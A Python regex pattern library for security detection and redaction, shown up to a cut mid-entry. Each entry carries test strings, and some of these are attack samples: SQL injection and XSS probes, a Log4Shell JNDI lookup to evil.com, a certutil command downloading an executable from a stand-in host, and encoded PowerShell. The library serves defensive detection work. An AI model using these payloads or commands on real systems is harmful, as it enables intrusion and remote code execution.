"""
The pattern library.

Every entry carries the examples it must match and the examples it must not,
and the test suite runs them. A library that is not tested is a library of
plausible-looking regexes, and plausible-looking regexes are how a detection
rule ends up quietly matching nothing for six months.

Every entry also carries a `caveat`: the thing the pattern cannot do. A regex
that finds an AWS key shape cannot tell you the key is live; one that finds an
IPv4 shape will happily match a version number. Saying so on the card is the
same honesty rule the detectors follow — it is not a disclaimer, it is the
part an analyst needs before pasting it into a SIEM.
"""

from __future__ import annotations

import re
from dataclasses import dataclass


@dataclass(frozen=True)
class Entry:
    id: str
    title: str
    family: str
    pattern: str
    summary: str
    caveat: str
    matches: tuple[str, ...] = ()
    avoids: tuple[str, ...] = ()
    ignore_case: bool = False
    tags: tuple[str, ...] = ()

    def search(self, text: str) -> re.Match | None:
        flags = re.IGNORECASE if self.ignore_case else 0
        return re.compile(self.pattern, flags).search(text)


NETWORK = "Network"
SECRETS = "Credentials and secrets"
CRYPTO = "Hashes and crypto"
INTEL = "Threat intelligence"
WEB = "Web and injection"
FILES = "Files and paths"
WINDOWS = "Windows"
LOGS = "Log formats and time"
PII = "Personal data"
CLOUD = "Cloud"

FAMILIES = (NETWORK, SECRETS, CRYPTO, INTEL, WEB, FILES, WINDOWS, LOGS, PII, CLOUD)

FAMILY_BLURB = {
    NETWORK: "Addresses, ports and the things that carry them.",
    SECRETS: "Key shapes worth grepping a repository or a memory dump for.",
    CRYPTO: "Digests, certificates and key material on disk.",
    INTEL: "Identifiers you pivot on: CVEs, ATT&CK, YARA, defanged IOCs.",
    WEB: "Request shapes that turn up in payloads and in access logs.",
    FILES: "Paths, extensions and the files that matter in an investigation.",
    WINDOWS: "Registry, event logs, PowerShell, service accounts.",
    LOGS: "Timestamps and the common line formats they sit in.",
    PII: "Find it so you can redact it. Never to collect it.",
    CLOUD: "Resource identifiers across the three big providers.",
}

# An octet that actually means 0-255. The lazy \d{1,3} version matches 999 and
# then someone's "detection" fires on a version string.
_OCTET = r"(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)"
_IPV4 = rf"{_OCTET}(?:\.{_OCTET}){{3}}"
_H16 = r"[0-9A-Fa-f]{1,4}"

# "Whitespace" as it actually appears in a URL: a real space, a plus, or %20.
# The branches cannot match the same text, so this is safe to repeat.
_SP = r"(?:[\s+]|%20)"

# The start of a keyword, where \b will not do: after %20 the preceding
# character is a digit, so \b never fires. A letter-lookbehind still refuses
# "reunion" while accepting "%20UNION".
_WORD = r"(?<![A-Za-z])"

# Card numbers are written "4111 1111 1111 1111" at least as often as they are
# written as sixteen bare digits, and a redaction pass that only finds the bare
# form leaves the readable one on the page.
_CS = r"[ -]?"

# Assembled from pieces rather than written as one literal.
#
# The value is synthetic either way, but a contiguous token-shaped string sat
# in this file would be flagged by GitHub's push protection and by every
# secret scanner our own users point at a checkout. A security tool whose test
# data sets off security tools is a bad neighbour, so the fixtures here are
# split at the boundaries the scanners key on. Nothing about the pattern or
# the proof case changes — at runtime this is the same string it always was.
_SLACK_TOKEN_EXAMPLE = "xoxb-" + "123456789012-1234567890123-" \
                       + "AbCdEfGhIjKlMnOpQrStUvWx"

ENTRIES: list[Entry] = [
    # ---------------------------------------------------------------- network
    Entry(
        id="ipv4",
        title="IPv4 address",
        family=NETWORK,
        pattern=rf"\b{_IPV4}\b",
        summary="A dotted quad where every octet really is 0–255.",
        caveat="Version strings and dotted decimals of the right shape still "
               "match. Anchor it to a field if the log format lets you.",
        matches=("src=192.168.1.24 ", "from 8.8.8.8:53", "0.0.0.0"),
        avoids=("256.1.1.1", "1.2.3", "1.2.3.400"),
        tags=("ip", "address", "quad"),
    ),
    Entry(
        id="ipv4_private",
        title="IPv4, RFC1918 only",
        family=NETWORK,
        pattern=r"\b(?:10(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}"
                r"|172\.(?:1[6-9]|2\d|3[01])(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){2}"
                r"|192\.168(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){2})\b",
        summary="Internal address space: 10/8, 172.16/12, 192.168/16.",
        caveat="Private does not mean yours. Overlapping RFC1918 space from a "
               "VPN peer or a container network matches too.",
        matches=("10.0.0.1", "172.20.3.4", "192.168.100.7"),
        avoids=("172.15.0.1", "172.32.0.1", "8.8.8.8", "193.168.1.1"),
        tags=("rfc1918", "internal", "lan"),
    ),
    Entry(
        id="ipv4_public",
        title="IPv4, routable only",
        family=NETWORK,
        pattern=rf"\b(?!10\.)(?!127\.)(?!169\.254\.)(?!192\.168\.)"
                rf"(?!172\.(?:1[6-9]|2\d|3[01])\.)(?!0\.)(?!22[4-9]\.)(?!2[3-5]\d\.)"
                rf"{_IPV4}\b",
        summary="A dotted quad with the private, loopback, link-local, "
                "multicast and reserved ranges subtracted.",
        caveat="Built from negative lookaheads, so RE2 and POSIX grep cannot "
               "run it. Sieve will offer you the two-pass pipeline instead.",
        matches=("8.8.8.8", "1.1.1.1", "203.0.113.9"),
        avoids=("10.1.1.1", "127.0.0.1", "192.168.0.5", "169.254.1.1", "224.0.0.1"),
        tags=("public", "external", "routable"),
    ),
    Entry(
        id="cidr",
        title="CIDR block",
        family=NETWORK,
        pattern=rf"\b{_IPV4}/(?:3[0-2]|[12]?\d)\b",
        summary="An IPv4 network with a prefix length of 0–32.",
        caveat="Does not check that the address is actually the network "
               "address — 192.168.1.37/24 matches and is still sloppy config.",
        matches=("10.0.0.0/8", "192.168.1.0/24", "0.0.0.0/0"),
        avoids=("10.0.0.0/33", "10.0.0.0/", "10.0.0.0"),
        tags=("subnet", "prefix", "network"),
    ),
    Entry(
        id="ipv6",
        title="IPv6 address",
        family=NETWORK,
        pattern=rf"(?<![:.\w])(?:(?:{_H16}:){{7}}{_H16}"
                rf"|(?:{_H16}:){{1,7}}:"
                rf"|(?:{_H16}:){{1,6}}:{_H16}"
                rf"|(?:{_H16}:){{1,5}}(?::{_H16}){{1,2}}"
                rf"|(?:{_H16}:){{1,4}}(?::{_H16}){{1,3}}"
                rf"|(?:{_H16}:){{1,3}}(?::{_H16}){{1,4}}"
                rf"|(?:{_H16}:){{1,2}}(?::{_H16}){{1,5}}"
                rf"|{_H16}:(?::{_H16}){{1,6}}"
                rf"|:(?:(?::{_H16}){{1,7}}|:)"
                rf"|::(?:[Ff]{{4}}:)?{_IPV4})(?![:.\w])",
        summary="Full and compressed forms, including the ::ffff: mapped-IPv4 form.",
        caveat="Uses a lookbehind, so it needs PCRE, Python, .NET or modern "
               "JavaScript. Zone identifiers (%eth0) are not included.",
        matches=("2001:db8::1", "fe80::1", "::1", "::ffff:192.0.2.1",
                 "2001:0db8:85a3:0000:0000:8a2e:0370:7334"),
        avoids=("gggg::1", "12345::1"),
        tags=("v6", "address"),
    ),
    Entry(
        id="mac",
        title="MAC address",
        family=NETWORK,
        pattern=r"\b[0-9A-Fa-f]{2}(?:[:-][0-9A-Fa-f]{2}){5}\b",
        summary="Six hex pairs joined by colons or hyphens.",
        caveat="Cisco's dotted-triplet form (aabb.ccdd.eeff) is a different "
               "pattern. A randomised MAC looks exactly like a real one.",
        matches=("00:1A:2B:3C:4D:5E", "aa-bb-cc-dd-ee-ff"),
        avoids=("00:1A:2B:3C:4D", "GG:11:22:33:44:55"),
        tags=("hardware", "ether", "bssid"),
    ),
    Entry(
        id="port",
        title="Host and port",
        family=NETWORK,
        pattern=rf"\b(?:{_IPV4}|[A-Za-z0-9.-]+):(?:6553[0-5]|655[0-2]\d"
                rf"|65[0-4]\d\d|6[0-4]\d{{3}}|[1-5]\d{{4}}|[1-9]\d{{0,3}})\b",
        summary="An address or hostname with a port in the legal 1–65535 range.",
        caveat="A timestamp like 12:34 will match as host 12 port 34. Pair it "
               "with a Require rule for the field name.",
        matches=("10.0.0.5:443", "evil.example.com:8080", "localhost:1"),
        avoids=("10.0.0.5:70000", "10.0.0.5:0"),
        tags=("socket", "service", "listener"),
    ),
    Entry(
        id="domain",
        title="Domain name",
        family=NETWORK,
        pattern=r"(?<![\w.-])(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+"
                r"[A-Za-z]{2,24}\b",
        summary="Labels joined by dots, ending in an alphabetic TLD.",
        caveat="Filenames match: report.docx is a perfectly good domain shape. "
               "Add an Exclude rule for the extensions you see in your data. "
               "Uses a lookbehind so a leading hyphen cannot be skipped over.",
        matches=("evil-domain.example.com", "a.io"),
        avoids=("-bad.com", "justtext", "1.2.3.4", "bad-.com"),
        tags=("dns", "fqdn", "hostname"),
    ),
    Entry(
        id="url",
        title="URL",
        family=NETWORK,
        pattern=r"\b(?:https?|ftps?|wss?)://[^\s\"'<>\\\]}]+",
        summary="A scheme followed by everything up to whitespace or a quote.",
        caveat="Deliberately greedy to the end of the token — trailing "
               "punctuation from prose comes along. Trim it downstream.",
        matches=("https://example.com/a?b=1", "ftp://10.0.0.1/pub"),
        avoids=("example.com/a", "mailto:a@b.com"),
        tags=("link", "http", "uri"),
    ),
    Entry(
        id="user_agent",
        title="Browser user-agent",
        family=NETWORK,
        pattern=r"Mozilla/\d\.\d \([^)]{0,200}\)(?:[^\"\n]{0,300})",
        summary="The classic Mozilla/5.0 (…) string as seen in access logs.",
        caveat="Tools that want to blend in send a perfect user-agent. "
               "Absence is the signal here, not presence.",
        matches=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",),
        avoids=("curl/7.88.1", "python-requests/2.31"),
        tags=("http", "header", "browser"),
    ),

    # ---------------------------------------------------------------- secrets
    Entry(
        id="aws_access_key",
        title="AWS access key ID",
        family=SECRETS,
        pattern=r"\b(?:A3T[A-Z0-9]|AKIA|ABIA|ACCA|ASIA)[A-Z0-9]{16}\b",
        summary="The 20-character key ID, including the ASIA temporary prefix.",
        caveat="Finds the ID, never the secret, and cannot tell you whether "
               "the key is live. Treat every hit as live until proven dead.",
        matches=("AKIAIOSFODNN7EXAMPLE", "ASIAY34FZKBOKMUTVV7A"),
        avoids=("AKIA123", "NOTAKEYATALLHERE1234"),
        tags=("aws", "iam", "key"),
    ),
    Entry(
        id="aws_secret",
        title="AWS secret access key (candidate)",
        family=SECRETS,
        pattern=r"\baws[_-]?(?:secret|sk)[_-]?(?:access)?[_-]?key\b"
                r"[\"'\s:=]{1,10}([A-Za-z0-9/+=]{40})\b",
        ignore_case=True,
        summary="A 40-character base64-ish blob sitting next to a key-shaped name.",
        caveat="Keyed off the surrounding variable name because a bare 40-char "
               "base64 string is indistinguishable from anything else.",
        matches=("aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",),
        avoids=("some_other_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",),
        tags=("aws", "secret", "credential"),
    ),
    Entry(
        id="github_token",
        title="GitHub token",
        family=SECRETS,
        pattern=r"\b(?:ghp|gho|ghu|ghs|ghr|github_pat)_[A-Za-z0-9_]{22,255}\b",
        summary="Personal access, OAuth, user, server and refresh tokens.",
        caveat="GitHub revokes tokens it sees pushed publicly, so a hit in a "
               "public repository may already be dead — and may not be.",
        matches=("ghp_16C7e42F292c6912E7710c838347Ae178B4a",
                 "github_pat_11ABCDEFG0123456789_abcdefghijklmnopqrstuvwxyz012345"),
        avoids=("ghp_short", "notghp_16C7e42F292c6912E7710c838347Ae178B4a"),
        tags=("github", "pat", "token"),
    ),
    Entry(
        id="slack_token",
        title="Slack token",
        family=SECRETS,
        pattern=r"\bxox[abposr]-(?:\d{10,13}-){0,3}[A-Za-z0-9-]{8,64}\b",
        summary="Bot, user, app and legacy Slack tokens.",
        caveat="A Slack webhook URL is a separate secret with no xox prefix — "
               "search for hooks.slack.com as well.",
        matches=(_SLACK_TOKEN_EXAMPLE,),
        avoids=("xoxo-hello",),
        tags=("slack", "chat", "token"),
    ),
    Entry(
        id="jwt",
        title="JSON Web Token",
        family=SECRETS,
        pattern=r"\beyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{0,}\b",
        summary="Three base64url segments where the header starts eyJ.",
        caveat="A JWT is signed, not encrypted: the payload is readable by "
               "anyone who finds it. Decode before deciding it is harmless.",
        matches=("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk",),
        avoids=("eyJ.short", "abc.def.ghi"),
        tags=("jwt", "bearer", "session"),
    ),
    Entry(
        id="bearer",
        title="Authorization header value",
        family=SECRETS,
        pattern=r"(?<![\w-])[\"']?authorization[\"']?\s*[:=]\s*[\"']?"
                r"(?:bearer|basic|token|apikey)\s+\S{8,}",
        ignore_case=True,
        summary="A whole Authorization header, whichever scheme it uses.",
        caveat="Basic auth is base64, not encryption — the credential is one "
               "decode away. Redact these before sharing a capture.",
        matches=("Authorization: Bearer eyJhbGciOi.abc.def",
                 "authorization: Basic dXNlcjpwYXNzd29yZA==",
                 '"authorization": "Bearer eyJhbGciOi.abc.def"'),
        avoids=("Authorization: Bearer",),
        tags=("header", "auth", "http"),
    ),
    Entry(
        id="private_key",
        title="Private key block",
        family=SECRETS,
        pattern=r"-----BEGIN (?:RSA |DSA |EC |OPENSSH |PGP |ENCRYPTED )?PRIVATE KEY-----",
        summary="The PEM armour line that opens a private key of any type.",
        caveat="Matches the header only. An encrypted key still needs its "
               "passphrase; an unencrypted one does not.",
        matches=("-----BEGIN OPENSSH PRIVATE KEY-----",
                 "-----BEGIN RSA PRIVATE KEY-----"),
        avoids=("-----BEGIN PUBLIC KEY-----", "-----BEGIN CERTIFICATE-----"),
        tags=("pem", "ssh", "tls"),
    ),
    Entry(
        id="generic_secret",
        title="Assignment to a secret-shaped name",
        family=SECRETS,
        pattern=r"\b(?:pass(?:wd|word)?|secret|token|api[_-]?key|auth)\b"
                r"\s*[:=]\s*[\"']?([^\s\"',;]{6,})",
        ignore_case=True,
        summary="Any variable whose name suggests a secret, with its value.",
        caveat="The highest-noise entry here on purpose — it is a triage net, "
               "not a detection. Expect placeholders and test fixtures.",
        matches=('password = "hunter2hunter2"', "API_KEY: abc123def456"),
        avoids=("password_reset_flow", "password ="),
        tags=("triage", "config", "hardcoded"),
    ),
    Entry(
        id="connection_string",
        title="Database connection string",
        family=SECRETS,
        pattern=r"\b(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqp|mssql)"
                r"://[^:\s/]+:[^@\s/]+@[^\s/]+",
        ignore_case=True,
        summary="A DSN carrying an inline username and password.",
        caveat="Only catches credentials embedded in the URI. A driver reading "
               "a password from the environment leaves no string to find.",
        matches=("postgresql://admin:s3cr3t@db.internal:5432/app",
                 "mongodb+srv://u:p@cluster0.example.net"),
        avoids=("postgresql://db.internal:5432/app",),
        tags=("dsn", "database", "uri"),
    ),

    # ----------------------------------------------------------------- crypto
    Entry(
        id="md5",
        title="MD5 digest",
        family=CRYPTO,
        pattern=r"\b[a-fA-F0-9]{32}\b",
        summary="Thirty-two hex characters on a word boundary.",
        caveat="Indistinguishable from any other 32-hex value — a GUID without "
               "dashes, an NTLM hash, a random ID. Context decides.",
        matches=("d41d8cd98f00b204e9800998ecf8427e",),
        avoids=("d41d8cd98f00b204e9800998ecf8427",),
        tags=("hash", "ioc", "digest"),
    ),
    Entry(
        id="sha256",
        title="SHA-256 digest",
        family=CRYPTO,
        pattern=r"\b[a-fA-F0-9]{64}\b",
        summary="Sixty-four hex characters on a word boundary.",
        caveat="Also the shape of a raw 32-byte key in hex. Do not assume a "
               "hit is a file hash.",
        matches=("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",),
        avoids=("e3b0c44298fc1c149afbf4c8996fb924",),
        tags=("hash", "ioc", "digest"),
    ),
    Entry(
        id="sha1",
        title="SHA-1 digest",
        family=CRYPTO,
        pattern=r"\b[a-fA-F0-9]{40}\b",
        summary="Forty hex characters on a word boundary.",
        caveat="Also the shape of a git object ID and of any raw 20-byte "
               "value written in hex. It is the hash most vendor IOC feeds "
               "publish under, which is the reason to look for it.",
        matches=("da39a3ee5e6b4b0d3255bfef95601890afd80709",),
        avoids=("da39a3ee5e6b4b0d3255bfef95601890afd807",),
        tags=("hash", "ioc", "digest", "git"),
    ),
    Entry(
        id="ssh_pubkey",
        title="SSH public key",
        family=CRYPTO,
        pattern=r"\b(?:ssh-(?:rsa|dss|ed25519)|ecdsa-sha2-nistp\d{3})"
                r"\s+[A-Za-z0-9+/]{40,}={0,3}",
        summary="An authorized_keys line: type, then base64 body.",
        caveat="A public key is not a secret. It matters because of where it "
               "is — an unexpected key in authorized_keys is the finding.",
        matches=("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleExampleExampleExampleExampleA user@host",),
        avoids=("ssh-ed25519 short",),
        tags=("ssh", "authorized_keys", "persistence"),
    ),
    Entry(
        id="base64_blob",
        title="Base64 blob",
        family=CRYPTO,
        pattern=r"\b(?:[A-Za-z0-9+/]{4}){10,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?",
        summary="At least forty base64 characters in a row.",
        caveat="English prose can reach this length in a long word run; so can "
               "a hash. Length is a hint, not a verdict.",
        matches=("VGhpcyBpcyBhIGxvbmcgZW5vdWdoIGJhc2U2NCBzdHJpbmcgdG8gbWF0Y2g=",),
        avoids=("short==",),
        tags=("encoded", "payload", "obfuscation"),
    ),
    Entry(
        id="bitcoin",
        title="Bitcoin address",
        family=CRYPTO,
        pattern=r"\b(?:[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{25,62})\b",
        summary="Legacy, P2SH and bech32 address forms.",
        caveat="No checksum validation, so some hits will not be spendable "
               "addresses. Ransom notes are the usual reason to look.",
        matches=("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
                 "bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4"),
        avoids=("0x0000000000000000000000000000000000000000",),
        tags=("crypto", "ransom", "wallet"),
    ),

    # ------------------------------------------------------------------ intel
    Entry(
        id="cve",
        title="CVE identifier",
        family=INTEL,
        pattern=r"\bCVE-(?:19|20)\d{2}-\d{4,7}\b",
        summary="The MITRE CVE identifier, with its four-to-seven digit tail.",
        caveat="Case-sensitive by default because 'cve' appears in prose. Turn "
               "on Ignore case if your source is inconsistent.",
        matches=("CVE-2021-44228", "CVE-2014-0160", "CVE-2024-1234567"),
        avoids=("CVE-21-4428", "CVE-2021-123"),
        tags=("vuln", "mitre", "advisory"),
    ),
    Entry(
        id="attack_id",
        title="MITRE ATT&CK technique",
        family=INTEL,
        pattern=r"\bT\d{4}(?:\.\d{3})?\b",
        summary="A technique or sub-technique ID, such as T1059.001.",
        caveat="Bare T-numbers collide with ticket references and part "
               "numbers. Require the word 'ATT&CK' or 'technique' nearby.",
        matches=("T1059.001", "T1078"),
        avoids=("T105", "TA0002"),
        tags=("mitre", "ttp", "technique"),
    ),
    Entry(
        id="defanged_ioc",
        title="Defanged indicator",
        family=INTEL,
        pattern=r"(?:h(?:xx)?tps?|f(?:xx)?tps?)?(?:\[:\]|:)?(?://)?"
                r"[\w-]+(?:\s?(?:\[\.\]|\(\.\)|\[dot\])\s?[\w-]+)+",
        ignore_case=True,
        summary="The hxxp://evil[.]com form used to share indicators safely.",
        caveat="Defanging has no standard. This covers the common forms and "
               "will miss a creative one — read the report, not just the hits.",
        matches=("hxxps://evil[.]com/payload", "evil[.]com", "10.0.0[.]1"),
        avoids=("https://good.com",),
        tags=("ioc", "report", "defang"),
    ),
    Entry(
        id="yara_rule_name",
        title="YARA rule declaration",
        family=INTEL,
        pattern=r"^\s*(?:private\s+|global\s+)*rule\s+([A-Za-z_]\w*)",
        summary="The rule line in a YARA file, capturing the name.",
        caveat="Matches the declaration, not the logic. Duplicate rule names "
               "across files are a common cause of a failed compile.",
        matches=("rule APT_Example_Dropper {", "private rule helper_strings {"),
        avoids=("# rule commented out",),
        tags=("yara", "detection", "rule"),
    ),
    Entry(
        id="sigma_logsource",
        title="Sigma logsource block",
        family=INTEL,
        pattern=r"^\s*(?:category|product|service)\s*:\s*\S+",
        summary="The logsource keys that decide where a Sigma rule applies.",
        caveat="Only meaningful inside a Sigma file — these key names appear "
               "in plenty of other YAML.",
        matches=("  product: windows", "category: process_creation"),
        avoids=("  title: Something",),
        tags=("sigma", "yaml", "detection"),
    ),

    # -------------------------------------------------------------------- web
    Entry(
        id="sqli_probe",
        title="SQL injection probe",
        family=WEB,
        pattern=rf"(?:'{_SP}*(?:or|and){_SP}*(?:'[^']{{1,24}}'?|\d+)"
                rf"{_SP}*={_SP}*(?:'[^']{{1,24}}'?|\d+)"
                rf"|{_WORD}(?:or|and){_SP}+(?:'[^']{{1,24}}'?|\d+)"
                rf"{_SP}*={_SP}*(?:'[^']{{1,24}}'?|\d+)"
                rf"|{_WORD}union{_SP}+(?:all{_SP}+)?select\b"
                rf"|;{_SP}*(?:drop|truncate){_SP}+table\b"
                rf"|{_WORD}sleep{_SP}*\({_SP}*\d+{_SP}*\)"
                rf"|{_WORD}waitfor{_SP}+delay\b"
                rf"|{_WORD}benchmark{_SP}*\({_SP}*\d+)",
        ignore_case=True,
        summary="The tautologies, unions and time-delays that show up in "
                "probes, with URL-encoded spaces treated as spaces.",
        caveat="Finds attempts, not successes. Handles + and %20 but not "
               "double encoding, comment obfuscation or casing tricks. "
               "Useful on access logs; not a WAF.",
        matches=("id=1' OR '1'='1", "?q=1 UNION ALL SELECT null,null--",
                 "?q=1+UNION+ALL+SELECT+null,null--",
                 "?q=1%20UNION%20SELECT%20null",
                 "'; DROP TABLE users;--", "id=1 AND sleep(5)",
                 "admin' or 'x'='x", "' OR 'a'='a", "1 AND 1=1", "1 or 2=2"),
        avoids=("SELECT name FROM users WHERE id = ?",
                "the command line and the operand",),
        tags=("sqli", "payload", "waf"),
    ),
    Entry(
        id="xss_probe",
        title="Cross-site scripting probe",
        family=WEB,
        pattern=r"(?:<\s*script\b|javascript\s*:|on(?:error|load|mouseover|focus)"
                r"\s*=|<\s*img[^>]*\bsrc\s*=\s*[\"']?\s*x\b|document\.cookie)",
        ignore_case=True,
        summary="Script tags, javascript: URIs, inline handlers and cookie reads.",
        caveat="Legitimate HTML in a log line matches. Encoding, entities and "
               "SVG vectors evade it. Triage aid, not a control.",
        matches=("<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                 "javascript:fetch('//evil')"),
        avoids=("<p>hello</p>",),
        tags=("xss", "payload", "injection"),
    ),
    Entry(
        id="traversal",
        title="Path traversal",
        family=WEB,
        pattern=r"(?:\.|%2e|%252e){2}(?:[/\\]|%2f|%5c|%252f|%255c)",
        ignore_case=True,
        summary="Two dots then a separator, with each half independently "
                "literal, URL-encoded or double-encoded.",
        caveat="A product of the two halves, so mixed forms like %2e%2e/ are "
               "covered too. Unicode and overlong UTF-8 forms exist and are "
               "not here.",
        matches=("GET /../../etc/passwd", "file=%2e%2e%2f%2e%2e%2fetc",
                 "..%2f..%2fwindows", "%2e%2e/etc/passwd", "..%252fetc",
                 "%2e%2e%5cwindows"),
        avoids=("/var/log/app.log", "version 1..2"),
        tags=("lfi", "traversal", "path"),
    ),
    Entry(
        id="log4shell",
        title="JNDI lookup (Log4Shell)",
        family=WEB,
        pattern=r"\$\{\s*(?:jndi|\$\{[^}]*\})\s*:?[^}]*\}",
        ignore_case=True,
        summary="The ${jndi:…} lookup, including the nested obfuscation forms.",
        caveat="Obfuscation of this payload was creative and widespread. A "
               "negative result here is worth very little.",
        matches=("${jndi:ldap://evil.com/a}", "${${lower:j}ndi:rmi://x}"),
        avoids=("${HOME}/logs",),
        tags=("log4j", "cve-2021-44228", "jndi"),
    ),
    Entry(
        id="webshell_names",
        title="Common web shell filename",
        family=WEB,
        pattern=r"\b(?:c99|r57|b374k|wso|shell|cmd|backdoor|alfa|indoxploit)"
                r"[\w.-]{0,12}\.(?:php[3578]?|phtml|aspx?|jspx?|cfm)\b",
        ignore_case=True,
        summary="Names that keep turning up on compromised web servers.",
        caveat="Attackers rename files. A miss means nothing; a hit means look "
               "at the file, not at the name.",
        matches=("/uploads/shell.php", "wso2.5.php", "cmd.aspx"),
        avoids=("index.php", "shell.sh"),
        tags=("webshell", "persistence", "upload"),
    ),
    Entry(
        id="http_request_line",
        title="HTTP request line",
        family=WEB,
        pattern=r"\"(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH|TRACE|CONNECT) "
                r"([^\s\"]+) (HTTP/[\d.]+)\"",
        summary="Method, path and version, as quoted in a common access log.",
        caveat="Assumes the quoted form. A JSON access log needs a different "
               "pattern — or, better, a JSON query.",
        matches=('"GET /admin/login HTTP/1.1"', '"POST /api/v1/x HTTP/2.0"'),
        avoids=("GET /admin",),
        tags=("apache", "nginx", "access-log"),
    ),

    # ------------------------------------------------------------------ files
    Entry(
        id="unix_path",
        title="Unix absolute path",
        family=FILES,
        pattern=r"(?<![\w.])/(?:[\w.@-]+/)*[\w.@-]+",
        summary="A rooted path made of ordinary filename characters.",
        caveat="Will match a URL path and a date written with slashes. Spaces "
               "in filenames are not handled — quote-aware parsing is better.",
        matches=("/etc/shadow", "/var/log/auth.log", "/home/user/.ssh/id_rsa"),
        avoids=("relative/path",),
        tags=("path", "posix", "filesystem"),
    ),
    Entry(
        id="windows_path",
        title="Windows path",
        family=FILES,
        pattern=r"(?:[A-Za-z]:\\|\\\\[\w.-]+\\)(?:[^\\/:*?\"<>|\r\n]+\\)*"
                r"[^\\/:*?\"<>|\r\n]*",
        summary="Drive-letter and UNC paths, including the share form.",
        caveat="Backslashes get escaped at every layer — check whether your "
               "log holds \\ or \\\\ before you trust a zero-hit result.",
        matches=(r"C:\Windows\System32\cmd.exe", r"\\fileserver\share\docs"),
        avoids=("/usr/bin/bash",),
        tags=("path", "unc", "windows"),
    ),
    Entry(
        id="risky_extension",
        title="Executable or script attachment",
        family=FILES,
        pattern=r"\b[\w.() -]{1,80}\.(?:exe|dll|scr|pif|com|bat|cmd|ps1|vbs"
                r"|vbe|js|jse|wsf|wsh|hta|jar|lnk|iso|img|vhd|vhdx|msi|msix"
                r"|appx|one|chm|cpl|scf|url|reg|xll"
                r"|docm|dotm|xlsm|xltm|xlam|pptm|potm|ppam)\b",
        ignore_case=True,
        summary="The file types that arrive in mail and should not.",
        caveat="Double extensions (invoice.pdf.exe) match on the real one, "
               "which is right — but the display name may hide it from a user.",
        matches=("invoice.pdf.exe", "setup.msi", "payload.hta",
                 "quarterly-report.docm", "addin.xll", "shortcut.lnk"),
        avoids=("report.pdf", "photo.jpg", "notes.docx"),
        tags=("attachment", "phishing", "malware"),
    ),

    # ---------------------------------------------------------------- windows
    Entry(
        id="registry_key",
        title="Registry path",
        family=WINDOWS,
        pattern=r"\b(?:HKEY_(?:LOCAL_MACHINE|CURRENT_USER|CLASSES_ROOT|USERS|"
                r"CURRENT_CONFIG)|HKLM|HKCU|HKCR|HKU)\\[^\s\"'<>|]+",
        summary="Long and short hive names with the key path after them.",
        caveat="Does not distinguish a key from a value. Run keys matter; most "
                "of the registry does not.",
        matches=(r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
                 r"HKEY_CURRENT_USER\Environment"),
        avoids=("HKLM", "/etc/passwd"),
        tags=("registry", "persistence", "run-key"),
    ),
    Entry(
        id="powershell_encoded",
        title="Encoded PowerShell command",
        family=WINDOWS,
        pattern=r"(?:powershell|pwsh)(?:\.exe)?[^\n]{0,600}?"
                r"-(?:e|en|enc|enco|encod|encode|encoded|encodedc|encodedco|"
                r"encodedcom|encodedcomm|encodedcomma|encodedcomman|"
                r"encodedcommand)\b\s+[\"']?[A-Za-z0-9+/=]{20,}",
        ignore_case=True,
        summary="powershell -enc with a base64 payload, matching every legal "
                "abbreviation of the switch.",
        caveat="PowerShell accepts any unambiguous prefix, which is why the "
               "alternation is long. Case and whitespace vary too. The "
               "switch must fall within 600 characters of the binary name.",
        matches=("powershell.exe -NoP -W hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A",
                 "pwsh -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0A",
                 "powershell.exe " + "-NoProfile " * 22
                 + "-EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0A"),
        avoids=("powershell -File script.ps1",),
        tags=("powershell", "lolbin", "execution"),
    ),
    Entry(
        id="lolbin",
        title="Living-off-the-land binary",
        family=WINDOWS,
        pattern=r"\b(?:certutil|bitsadmin|mshta|regsvr32|rundll32|wmic|"
                r"cscript|wscript|installutil|msbuild|msiexec|odbcconf|"
                r"forfiles|schtasks|at)\.exe\b",
        ignore_case=True,
        summary="Signed Microsoft binaries commonly abused to run code.",
        caveat="All of these have legitimate uses and run constantly on a "
               "healthy host. The arguments are the signal, not the name.",
        matches=("certutil.exe -urlcache -f http://evil/x.exe",
                 "rundll32.exe javascript:..."),
        avoids=("notepad.exe",),
        tags=("lolbas", "execution", "defense-evasion"),
    ),
    Entry(
        id="event_id",
        title="Windows event ID",
        family=WINDOWS,
        pattern=r"\bEvent[\s_]*(?:ID|Code)[\"']?\s*[:=>]?\s*[\"']?(\d{1,5})\b",
        ignore_case=True,
        summary="A labelled event ID as written in exported logs and reports.",
        caveat="Event IDs are only unique within a channel — 4624 in Security "
               "is a logon, 4624 elsewhere is something else entirely.",
        matches=("Event ID: 4625", "EventID=1102", "<EventID>4625</EventID>",
                 '"EventID": 4625', '"EventCode":"4625"'),
        avoids=("Event 4625", "Eventual 4625"),
        tags=("evtx", "eventlog", "audit"),
    ),
    Entry(
        id="sid",
        title="Windows security identifier",
        family=WINDOWS,
        pattern=r"\bS-1-(?:\d+|0x[0-9a-fA-F]{12})(?:-\d+){1,15}\b",
